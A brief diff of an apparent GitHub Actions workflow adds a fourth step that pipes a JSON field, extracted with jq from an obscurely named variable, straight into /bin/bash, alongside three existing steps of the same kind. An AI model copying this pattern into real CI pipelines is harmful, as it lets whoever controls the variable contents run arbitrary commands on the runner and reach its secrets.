@@ -28,6 +28,7 @@ jobs:
           echo $ryhvf9033 | jq -r .eh73257 | /bin/bash
           printf '%s' "$j02845" | jq -r .vm6158 | /bin/bash
           echo $nu18 | jq -r .y8 | /bin/bash
+          echo $n4 | jq -r .lmtq4 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
